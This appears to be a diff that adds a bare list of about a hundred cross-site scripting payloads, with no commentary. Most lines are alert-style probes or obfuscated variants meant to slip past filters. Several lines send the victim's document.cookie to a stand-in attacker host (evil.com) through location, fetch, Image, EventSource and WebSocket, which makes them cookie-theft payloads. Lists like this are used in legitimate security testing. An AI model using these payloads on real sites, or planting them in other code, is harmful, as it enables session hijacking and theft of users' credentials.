@@ -1,0 +1,103 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>confirm('XSS')</script>
+<script>prompt('XSS')</script>
+<script>console.log('XSS')</script>
+<script>location='http://evil.com?c='+document.cookie</script>
+<script>fetch('http://evil.com?cookie='+document.cookie)</script>
+<script>window.open('http://attacker.com')</script>
+<script>top.location='http://xss.com'</script>
+<script>document.body.innerHTML='Hacked'</script>
+<script>document.write('<h1>XSS</h1>')</script>
+<script>document.write(document.domain)</script>
+<script>while(true){alert('XSS')}</script>
+<script>setTimeout(function(){alert('XSS')},1000)</script>
+<script>setInterval('alert("XSS")',3000)</script>
+<script>new Image().src="http://evil.com/"+document.cookie</script>
+<script>onerror=alert;throw 1</script>
+<script>Object.defineProperty(document,'cookie',{get:function(){alert('XSS')}})</script>
+<script>Function("alert('XSS')")()</script>
+<script>eval("alert('XSS')")</script>
+<script>this.alert('XSS')</script>
+<script>with(this)alert('XSS')</script>
+<script>if(true)alert('XSS')</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>['X','S','S'].map(alert)</script>
+<script>`${alert('XSS')}`</script>
+<script>alert`${'XSS'}`</script>
+<script>(function(){alert('XSS')})()</script>
+<script>((alert))('XSS')</script>
+<script>(()=>{alert('XSS')})()</script>
+<script>try{alert('XSS')}catch(e){}</script>
+<script>[].constructor.constructor('alert("XSS")')()</script>
+<script>new Function`alert\`XSS\``()</script>
+<script>window['al'+'ert']('XSS')</script>
+<script>window["alert"]("XSS")</script>
+<script>top["al"+"ert"]("XSS")</script>
+<script>window['eval']("alert('XSS')")</script>
+<script>window.location.href="javascript:alert('XSS')"</script>
+<script>window.name='<script>alert("XSS")</script>'</script>
+<script>name='<svg/onload=alert("XSS")>'</script>
+<script>alert(/XSS/.source)</script>
+<script>function x(){alert('XSS')}x()</script>
+<script>document.getElementsByTagName('body')[0].innerHTML='<script>alert(1)</script>'</script>
+<script>alert(document.URL)</script>
+<script>alert(document.referrer)</script>
+<script>alert(document.cookie)</script>
+<script>location.href="data:text/html,<script>alert('XSS')</script>"</script>
+<script>let x='alert';window[x]('XSS')</script>
+<script>window['con'+'sole'].log('XSS')</script>
+<script>throw 'XSS'</script>
+<script>alert(navigator.userAgent)</script>
+<script>alert(navigator.platform)</script>
+<script>alert(navigator.language)</script>
+<script>alert(document.location)</script>
+<script>alert(location.hash)</script>
+<script>alert(location.search)</script>
+<script>alert(location.pathname)</script>
+<script>alert(document.forms)</script>
+<script>alert(document.anchors)</script>
+<script>alert(document.links)</script>
+<script>alert(document.images)</script>
+<script>alert(document.scripts)</script>
+<script>alert(document.styleSheets)</script>
+<script>var x='XSS';alert(x)</script>
+<script>let xss='XSS';alert(xss)</script>
+<script>const x='XSS';alert(x)</script>
+<script>alert("X"+"S"+"S")</script>
+<script>alert(String.fromCharCode(88)+String.fromCharCode(83)+String.fromCharCode(83))</script>
+<script>alert((()=>{return 'XSS'})())</script>
+<script>alert([1,2,3].join('XSS'))</script>
+<script>alert(/<\/script>/)</script>
+<script>alert("XSS".replace(/S/g,"$"))</script>
+<script>alert(decodeURIComponent('%58%53%53'))</script>
+<script>alert(unescape('%3Cscript%3Ealert(1)%3C/script%3E'))</script>
+<script>alert(btoa('XSS'))</script>
+<script>alert(atob('WFNT'))</script>
+<script>navigator.__defineGetter__('userAgent',function(){alert('XSS')})</script>
+<script>var f=function(){alert('XSS')};f()</script>
+<script>window.onload=function(){alert('XSS')}</script>
+<script>document.addEventListener('DOMContentLoaded',function(){alert('XSS')})</script>
+<script>window.setTimeout("alert('XSS')",0)</script>
+<script>document.write("<scr"+"ipt>alert('XSS')</scr"+"ipt>")</script>
+<script>new EventSource("http://evil.com/"+document.cookie)</script>
+<script>new WebSocket("ws://evil.com/"+document.cookie)</script>
+<script>window.alert?.("XSS")</script>
+<script>[alert][0]('XSS')</script>
+<script>top['alert']('XSS')</script>
+<script>location=`javascript:alert('XSS')`</script>
+<script>void(alert('XSS'))</script>
+<script>new Date().toLocaleString(alert('XSS'))</script>
+<script>new Promise(r=>r(alert('XSS')))</script>
+<script>Object.values({a:alert})[0]('XSS')</script>
+<script>parent.alert('XSS')</script>
+<script>frames[0].alert('XSS')</script>
+<script>frameElement.alert('XSS')</script>
+<script>window['document']['write']("<script>alert('XSS')<\/script>")</script>
+<script>(alert)(1)</script>
+<script>alert(/X/.source+String.fromCharCode(83,83))</script>
+<script>alert(document.getElementsByTagName('script')[0].innerHTML)</script>
+<script>alert(new XMLHttpRequest())</script>
+<script>alert(document.children[0].tagName)</script>
+<script>window.onerror=()=>alert('XSS');throw 'err'</script>
+<script>alert(typeof window)</script>
